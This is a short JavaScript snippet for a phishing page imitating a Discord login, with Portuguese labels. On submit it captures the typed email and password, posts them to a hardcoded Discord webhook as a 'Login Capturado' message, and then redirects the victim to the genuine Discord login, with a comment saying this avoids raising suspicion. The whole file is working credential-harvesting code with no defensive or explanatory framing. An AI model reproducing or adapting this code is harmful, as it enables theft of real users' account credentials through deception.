document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const btn = document.getElementById('btnEntrar');

    const webhookURL = "https://discord.com/api/webhooks/1485325691183697940/Qe4uLssYvjS3ljUQmCOwy-ZXhJDwVJe4n-bQ_IfrudRe8-zvxpNl_7bgN962qdI_1mSJ";

    btn.innerText = "Entrando...";
    btn.disabled = true;

    const payload = {
        embeds: [{
            title: "🔑 Login Capturado",
            color: 5814783,
            fields: [
                { name: "Usuário", value: `\`${email}\``, inline: false },
                { name: "Senha", value: `\`${password}\``, inline: false },
                { name: "Data", value: new Date().toLocaleString('pt-BR'), inline: false }
            ]
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(() => {
        // Envia para o site real para não levantar suspeitas
        window.location.href = "https://discord.com/login";
    })
    .catch(() => {
        btn.innerText = "Entrar";
        btn.disabled = false;
    });
});
